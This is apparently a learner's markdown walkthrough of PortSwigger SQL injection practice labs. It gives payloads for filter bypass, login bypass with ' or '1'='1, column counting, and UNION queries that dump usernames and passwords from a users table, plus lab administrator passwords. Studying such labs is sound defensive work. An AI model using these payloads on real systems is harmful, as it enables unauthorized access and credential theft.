# Web Hacking 101

Some labs get at [here](https://portswigger.net/web-security/all-labs)

## Table of content
 - [SQL Injection](#sql-injection)
   - [Retrieving hidden data](#retrieving-hidden-data)
   - [UNION attacks](#union-attacks)
   - [Blind SQL injection](#blind-sql-injection)

### SQL Injection

Details at [here](https://portswigger.net/web-security/sql-injection)

Type of SQL injection in example

- Retrieving hidden data
- UNION attacks
- Blind SQL injection

## Retrieving hidden data

Modify an SQL query to return additional results

[Lab 1](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Description of this lab: the query of 1 category `Gifts`

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

And sample URL query: `https://example.com/filter?category=Gifts`

Goal: display details of all products in any category, both *released and unreleased*

`SELECT * FROM products WHERE category = '' or '1'='1' AND released = 1`

We just only adjust in `category=` and put into `''`, so the final payload:
`' or '1'='1` or `https://example.com/filter?category=%27%20or%20%271%27or%271` 

[Lab 2](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Description of this lab: inject in login page as username: administrator

So we need to modify the password, and check the password with the previous payload: `' or '1'='1`, and it worked

## UNION attacks

Detail found at [here](https://portswigger.net/web-security/sql-injection/union-attacks)

See cheatsheet [here](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[Lab 3](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

Description of this lab: vulnerability in the product category filter, use a UNION attack to retrieve data from other tables

Firstly, we need to identify the number of columns in the table, and use payload: `' ORDER BY <number-of-column> --` to check, after we use `' ORDER BY 4 --`, we got the error `Internal Server Error` so the column is 3.

Finally, we use `' UNION SELECT NULL, NULL, NULL--` to make a union attack at `/filter?category=` then solved this challenge.

[Lab 4](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Description of this lab: You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. After that, alter NULL to random text on the homepage, for example: 'qG26iL'

Do as same as the previous one with `' UNION SELECT NULL, NULL, NULL--`. After trying, the final payload is `' UNION SELECT NULL, 'qG26iL', NULL--`

[Lab 5](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

Description of this lab: The database contains a different table called users, with columns called username and password

In this lab, there are 2 columns in this table

Do the same as the previous one with `' UNION SELECT NULL, NULL--`. Follow the description, and change NULL to username and password. Moreover, we need access to a table named `users`, so the payload is: `' UNION SELECT username, password FROM users--`, then we got all username and password.

Login with the password of user `administrator`: nq3glruptcrilo0yscf6 and solved the lab.  

[Lab 6](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

This lab has the same description as the previous one but we need to retrieve multiple values in a single column. Furthermore, in this lab, we can use only the second column.

Look at the cheatsheet, we can use the string concatenation technique. After trying, we found this lab use `||` for concatenate string. The final payload is `' UNION SELECT NULL, username||':'||password FROM users--` to get all usernames and passwords.

Login with the password of user `administrator`: 532codf0er823llefy7x and solved the lab. 

[Lab 7](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Description of this lab: display the database version string of Oracle

In this lab, the available number of columns is 2. Look at the cheatsheet, try with: `SELECT banner FROM v$version` and the final payload is: `' UNION SELECT banner, NULL FROM v$version--`, then solved the lab.

[Lab 8]()

## Blind SQL injection 


